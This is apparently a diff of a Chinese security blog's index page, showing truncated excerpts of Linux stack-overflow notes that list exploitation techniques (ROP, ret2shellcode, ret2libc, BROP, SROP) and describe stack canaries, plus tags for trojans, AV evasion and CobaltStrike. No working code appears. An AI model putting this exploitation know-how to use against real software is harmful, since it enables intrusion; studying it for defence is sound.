-动态链接库：Windows的.dll、 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/118.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）">Linux栈溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-20T10:45:42.000Z" title="发表于 2020-11-20 18:45:42">2020-11-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+动态链接库：Windows的.dl ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/118.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）">Linux栈溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-20T10:45:42.000Z" title="发表于 2020-11-20 18:45:42">2020-11-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -945,6 +1029,7 @@ Linux下的ELF（Executable Linkable Format）
 
 
 写在前面的几个笔记
+
 CALL和RET指令解释
 
 
@@ -956,7 +1041,7 @@ AMD64和i386的区别
 由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下
 
 首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则就会抛出异常。
-其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI、RSI、RDX、RCX、 R8和R9中，如果还有更多的参数的话 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/117.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）">Linux栈溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-19T10:45:42.000Z" title="发表于 2020-11-19 18:45:42">2020-11-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
+其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI、RSI、RDX、RCX、 R8和R9中，如果还有更多的参数的 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/117.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）">Linux栈溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-19T10:45:42.000Z" title="发表于 2020-11-19 18:45:42">2020-11-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
 
 
 前言
@@ -966,7 +1051,9 @@ AMD64和i386的区别
 
 栈溢出利用方式
 
+
 ROP（修改返回地址，让其指向内存中已有的一段指令
+
 ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令
 ret2libc（修改返回地址，让其指向内存中已有的某个函数
 BROP
@@ -977,7 +1064,9 @@ SROP
 
 
 常用保护机制
-CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/171.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量与行列式"/></a><div class="content"><a class="title" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式">向量与行列式</a><time datetime="2023-09-25T15:58:53.000Z" title="发表于 2023-09-25 23:58:53">2023-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/170.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="重积分"/></a><div class="content"><a class="title" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分">重积分</a><time datetime="2023-09-11T15:58:53.000Z" title="发表于 2023-09-11 23:58:53">2023-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/169.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="方向导数、梯度与多元函数的极致与最值"/></a><div class="content"><a class="title" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值">方向导数、梯度与多元函数的极致与最值</a><time datetime="2023-07-25T15:58:53.000Z" title="发表于 2023-07-25 23:58:53">2023-07-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/168.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数微分的几何应用"/></a><div class="content"><a class="title" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用">多元函数微分的几何应用</a><time datetime="2023-07-03T15:58:53.000Z" title="发表于 2023-07-03 23:58:53">2023-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/167.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="隐函数求导"/></a><div class="content"><a class="title" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导">隐函数求导</a><time datetime="2023-06-24T15:58:53.000Z" title="发表于 2023-06-24 23:58:53">2023-06-24</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+
+CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护
+栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">84</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">73</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">26</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/171.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="向量与行列式"/></a><div class="content"><a class="title" href="/2023/09/25/LinearAlgebra_0x01/" title="向量与行列式">向量与行列式</a><time datetime="2023-09-25T15:58:53.000Z" title="发表于 2023-09-25 23:58:53">2023-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/170.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="重积分"/></a><div class="content"><a class="title" href="/2023/09/11/FurtherMathematics_0x11/" title="重积分">重积分</a><time datetime="2023-09-11T15:58:53.000Z" title="发表于 2023-09-11 23:58:53">2023-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/169.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="方向导数、梯度与多元函数的极致与最值"/></a><div class="content"><a class="title" href="/2023/07/25/FurtherMathematics_0x10/" title="方向导数、梯度与多元函数的极致与最值">方向导数、梯度与多元函数的极致与最值</a><time datetime="2023-07-25T15:58:53.000Z" title="发表于 2023-07-25 23:58:53">2023-07-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/168.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="多元函数微分的几何应用"/></a><div class="content"><a class="title" href="/2023/07/03/FurtherMathematics_0xF/" title="多元函数微分的几何应用">多元函数微分的几何应用</a><time datetime="2023-07-03T15:58:53.000Z" title="发表于 2023-07-03 23:58:53">2023-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/167.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="隐函数求导"/></a><div class="content"><a class="title" href="/2023/06/24/FurtherMathematics_0xE/" title="隐函数求导">隐函数求导</a><time datetime="2023-06-24T15:58:53.000Z" title="发表于 2023-06-24 23:58:53">2023-06-24</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
             <i class="fas fa-folder-open"></i>
             <span>分类</span>
             <a class="card-more-btn" href="/categories/" title="查看更多">
@@ -985,8 +1074,8 @@ CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护栈溢出保护是一�
             </div>
             <ul class="card-category-list" id="aside-cat-list">
             <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/C-%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">C++笔记</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CodeQL/"><span class="card-category-list-name">CodeQL</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Docker%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Docker笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/GDB%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">GDB笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Golang%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Golang笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Linux%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Linux笔记</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Windows%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Windows笔记</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/XSS/"><span class="card-category-list-name">XSS</span><span class="card-category-list-count">1</span></a></li>
-            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BadUSB/" style="font-size: 1.15em; color: rgb(126, 35, 111)">BadUSB</a><a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.19em; color: rgb(168, 129, 101)">钓鱼</a><a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.32em; color: rgb(138, 197, 17)">免杀</a><a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.28em; color: rgb(7, 109, 80)">木马</a><a href="/tags/%E7%97%85%E6%AF%92/" style="font-size: 1.19em; color: rgb(75, 27, 47)">病毒</a><a href="/tags/Metasploit/" style="font-size: 1.15em; color: rgb(11, 185, 107)">Metasploit</a><a href="/tags/CobaltStrike/" style="font-size: 1.19em; color: rgb(85, 137, 162)">CobaltStrike</a><a href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.15em; color: rgb(99, 95, 74)">绕虚拟机</a><a href="/tags/C/" style="font-size: 1.36em; color: rgb(8, 184, 147)">C++</a><a href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/" style="font-size: 1.15em; color: rgb(153, 143, 123)">C++命名规范</a><a href="/tags/%E6%AD%A3%E5%88%99/" style="font-size: 1.15em; color: rgb(49, 38, 37)">正则</a><a href="/tags/CSGO/" style="font-size: 1.41em; color: rgb(124, 139, 161)">CSGO</a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.41em; color: rgb(9, 21, 188)">破解</a><a href="/tags/%E5%A4%96%E6%8C%82/" style="font-size: 1.41em; color: rgb(129, 173, 172)">外挂</a><a href="/tags/CodeQL/" style="font-size: 1.15em; color: rgb(121, 140, 131)">CodeQL</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.15em; color: rgb(46, 200, 41)">数据库</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.15em; color: rgb(175, 136, 115)">SQL注入</a><a href="/tags/Docker/" style="font-size: 1.15em; color: rgb(127, 158, 175)">Docker</a><a href="/tags/XSS/" style="font-size: 1.19em; color: rgb(94, 53, 130)">XSS</a><a href="/tags/DLL%E5%8A%AB%E6%8C%81/" style="font-size: 1.15em; color: rgb(171, 68, 130)">DLL劫持</a><a href="/tags/ELF/" style="font-size: 1.15em; color: rgb(104, 23, 74)">ELF</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/" style="font-size: 1.15em; color: rgb(110, 85, 93)">无人机</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/" style="font-size: 1.15em; color: rgb(172, 174, 45)">无人机配件</a><a href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/" style="font-size: 1.15em; color: rgb(135, 191, 194)">去除特征</a><a href="/tags/%E9%AB%98%E6%95%B0/" style="font-size: 1.45em; color: rgb(173, 64, 1)">高数</a><a href="/tags/GDB/" style="font-size: 1.15em; color: rgb(100, 169, 168)">GDB</a><a href="/tags/Golang/" style="font-size: 1.15em; color: rgb(104, 132, 111)">Golang</a><a href="/tags/%E7%A1%AC%E4%BB%B6/" style="font-size: 1.15em; color: rgb(134, 150, 155)">硬件</a><a href="/tags/%E5%A0%86/" style="font-size: 1.24em; color: rgb(141, 162, 189)">堆</a><a href="/tags/%E6%A0%88/" style="font-size: 1.32em; color: rgb(167, 173, 123)">栈</a><a href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/" style="font-size: 1.15em; color: rgb(128, 25, 85)">内存结构</a><a href="/tags/%E6%BA%A2%E5%87%BA/" style="font-size: 1.32em; color: rgb(9, 184, 110)">溢出</a><a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 1.15em; color: rgb(114, 82, 151)">抓包</a><a href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(27, 66, 21)">双向认证</a><a href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(55, 36, 175)">单向认证</a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.24em; color: rgb(109, 123, 40)">信息收集</a><a href="/tags/%E7%BA%BF%E4%BB%A3/" style="font-size: 1.15em; color: rgb(123, 130, 117)">线代</a><a href="/tags/java%E7%8E%AF%E5%A2%83/" style="font-size: 1.15em; color: rgb(183, 26, 120)">java环境</a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 1.36em; color: rgb(173, 122, 159)">红蓝对抗</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 1.15em; color: rgb(22, 196, 187)">应急响应</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
-    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">2023年09月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">2023年07月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">2023年06月</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">2023年05月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">2023年04月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">2023年03月</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">2023年02月</span><span class="card-archive-list-count">5</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">2022年12月</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">84</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2017-08-08T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">226k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-09-27T10:02:33.375Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.githubusercontent.com/Ascotbe/Image/master/Blog/1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function subtitleType () {
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BadUSB/" style="font-size: 1.15em; color: rgb(114, 91, 184)">BadUSB</a><a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.19em; color: rgb(24, 119, 56)">钓鱼</a><a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.32em; color: rgb(107, 48, 12)">免杀</a><a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.28em; color: rgb(132, 9, 108)">木马</a><a href="/tags/%E7%97%85%E6%AF%92/" style="font-size: 1.19em; color: rgb(144, 37, 23)">病毒</a><a href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.15em; color: rgb(49, 138, 27)">绕虚拟机</a><a href="/tags/CobaltStrike/" style="font-size: 1.19em; color: rgb(118, 46, 95)">CobaltStrike</a><a href="/tags/Metasploit/" style="font-size: 1.15em; color: rgb(32, 3, 128)">Metasploit</a><a href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/" style="font-size: 1.15em; color: rgb(137, 195, 161)">C++命名规范</a><a href="/tags/C/" style="font-size: 1.36em; color: rgb(188, 136, 48)">C++</a><a href="/tags/%E6%AD%A3%E5%88%99/" style="font-size: 1.15em; color: rgb(44, 5, 95)">正则</a><a href="/tags/CSGO/" style="font-size: 1.41em; color: rgb(10, 198, 178)">CSGO</a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.41em; color: rgb(93, 64, 190)">破解</a><a href="/tags/%E5%A4%96%E6%8C%82/" style="font-size: 1.41em; color: rgb(48, 18, 123)">外挂</a><a href="/tags/XSS/" style="font-size: 1.19em; color: rgb(113, 196, 78)">XSS</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.15em; color: rgb(184, 129, 142)">数据库</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.15em; color: rgb(2, 199, 46)">SQL注入</a><a href="/tags/CodeQL/" style="font-size: 1.15em; color: rgb(4, 158, 63)">CodeQL</a><a href="/tags/DLL%E5%8A%AB%E6%8C%81/" style="font-size: 1.15em; color: rgb(85, 185, 59)">DLL劫持</a><a href="/tags/ELF/" style="font-size: 1.15em; color: rgb(144, 25, 47)">ELF</a><a href="/tags/Docker/" style="font-size: 1.15em; color: rgb(183, 28, 155)">Docker</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/" style="font-size: 1.15em; color: rgb(58, 76, 179)">无人机</a><a 